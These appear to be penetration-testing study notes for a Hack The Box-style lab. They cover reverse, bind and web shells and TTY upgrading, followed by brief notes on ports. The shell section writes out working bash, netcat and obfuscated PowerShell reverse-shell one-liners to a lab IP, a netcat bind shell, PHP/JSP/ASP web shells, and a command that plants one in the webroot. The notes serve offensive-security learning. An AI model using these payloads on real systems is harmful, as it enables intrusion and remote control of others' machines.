# Shell

There are three main types of shell connections:

1. Reverse Shell : Open a connection back to a listener on our attack box

Open a netcat listener on our attack box :
nc -lvnp 1234

Find our system's IP :
ip a
-> tun0 which is the interface connected to HTB VPN

Execute a payload on the target system which open a bash connection on the specific port we have opened :

(Depends on the targetedOS)

- bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
- powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

https://www.revshells.com/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md

Very fragile : if the connection is lost, we have to execute the initial exploit to gain access

2. Bind Shell : Bind to a specific port on the target host

Start a bind shell on the target host :

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

Launch a netcat connection from our attack box :

nc 10.10.10.1 1234

More reliable : if the connection is lost, we can connect back to it and get another connection immediately unless if the bind shell command stops (ex : if the remote host is rebooted)

3. Web Shell : Run commands through web browser

<?php system($_REQUEST["cmd"]); ?>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<% eval request("cmd") %>

We need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. 

Web Server -> Default Webroot
Apache  -> /var/www/html/
Nginx   -> /usr/local/nginx/html/
IIS     -> c:\inetpub\wwwroot\
XAMPP   -> C:\xampp\htdocs\

echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

Accessing web shell using cURL :

curl http://SERVER_IP:PORT/shell.php?cmd=id

More stealthy : Bypass any firewall rule because no connections are opened and will still work if the remote host reboot

Less pratical : Web Shell is not interactive as reverse and bind are but we can use a Python script to automate the process of web requests/responses and get a semi-interactive web shell using our terminal.

4. Upgrading TTY

Mapping our terminal TTY with the remote TTY in order to be able to navigate easily from left to right and in the historic.

Use the following commmand in our netcat shell to upgrade the type of our shell : python -c 'import pty; pty.spawn("/bin/bash")'

ctrl+z : background our shell and get back to our local terminal
stty raw -echo
fg : bring back our netcat shell on the foreground

[Enter]
[Enter]
www-data@remotehost$

Get our local TTY variables :
echo $TERM
stty size

Set TTY variables :
export TERM=xterm-256color
stty rows 67 columns 318



# Port

They are software-based and managed by the host operating system. Ports are associated with a specific process or service and allow computers to differentiate between different traffic types (SSH, Web requests, etc.)

2 categories of ports :
- TCP : connection-oriented (connection between client and server before sending data)
-> Server on a listening state
- UDP : connectionless communication model

Common ports : 
https://www.stationx.net/common-ports-cheat-sheet/
https://packetlife.net/media/library/23/common-ports.pdf

# Web Server

https://owasp.org/www-project-top-ten/